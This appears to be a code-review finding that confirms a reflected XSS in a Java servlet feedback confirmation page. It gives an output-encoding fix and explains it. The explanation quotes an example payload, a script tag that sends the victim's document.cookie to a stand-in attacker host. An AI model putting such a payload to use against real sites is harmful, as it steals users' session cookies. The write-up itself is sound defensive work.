## Verdict

Confirmed. `FeedbackRenderer.renderConfirmation` builds an HTML response by concatenating `submission.authorName` and `submission.comment` directly into a string that is written to the client with `out.println(html)`, with no HTML-entity encoding applied anywhere in the call chain.

## Source

`FeedbackController.handleSubmit` reads both tainted values straight from the HTTP request:

- `request.getParameter("comment")` (line 13, defaulted to `""` if absent)
- `request.getParameter("author")` (line 17, defaulted to `"Anonymous"` if absent)

These are wrapped unmodified into a `FeedbackRenderer.FeedbackSubmission` (line 22-23) and passed to `renderer.renderConfirmation(submission, response)` (line 24), so the taint crosses the file boundary from controller into renderer with no sanitization performed on either side.

## Fix

```java
package com.example.feedback;

import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.time.Instant;
import java.util.logging.Logger;

public class FeedbackRenderer {

    private static final Logger LOG = Logger.getLogger(FeedbackRenderer.class.getName());

    public static class FeedbackSubmission {
        final String authorName;
        final String comment;
        final Instant submittedAt;

        FeedbackSubmission(String authorName, String comment, Instant submittedAt) {
            this.authorName = authorName;
            this.comment = comment;
            this.submittedAt = submittedAt;
        }
    }

    public void renderConfirmation(FeedbackSubmission submission, HttpServletResponse response) throws IOException {
        LOG.info("Feedback received at " + submission.submittedAt);

        String html = "<html><body>"
                + "<h1>Thanks for your feedback, " + escapeHtml(submission.authorName) + "!</h1>"
                + "<p>You said: " + escapeHtml(submission.comment) + "</p>"
                + "</body></html>";

        response.setContentType("text/html");
        PrintWriter out = response.getWriter();
        out.println(html);
    }

    private static String escapeHtml(String value) {
        if (value == null) {
            return "";
        }
        StringBuilder sb = new StringBuilder(value.length());
        for (int i = 0; i < value.length(); i++) {
            char c = value.charAt(i);
            switch (c) {
                case '&': sb.append("&amp;"); break;
                case '<': sb.append("&lt;"); break;
                case '>': sb.append("&gt;"); break;
                case '"': sb.append("&quot;"); break;
                case '\'': sb.append("&#39;"); break;
                default: sb.append(c);
            }
        }
        return sb.toString();
    }
}
```

## Explanation

Both `authorName` and `comment` are attacker-controlled request parameters that flow unescaped into an HTML document body, so a value such as `<script>document.location='https://evil.example/?c='+document.cookie</script>` submitted as `comment` (or `author`) executes in the victim's browser when the confirmation page renders - a reflected XSS. The fix HTML-entity-encodes both values at the point they are concatenated into markup, converting `&`, `<`, `>`, `"`, and `'` into their corresponding entities so the browser renders them as literal text rather than parsing them as tags or attributes. Encoding is applied in the renderer, the single point where request data is turned into HTML, so it covers this call path regardless of what the controller does; a project already depending on OWASP Java Encoder or Apache Commons Text could call `Encode.forHtml(value)` or `StringEscapeUtils.escapeHtml4(value)` instead of the inline helper. This is output encoding, not input validation - the raw values are still stored and logged as submitted, only the HTML-rendering step is changed, which is correct because the same data may need to remain unescaped for non-HTML consumers (e.g. a JSON API or a log line) elsewhere in the application.
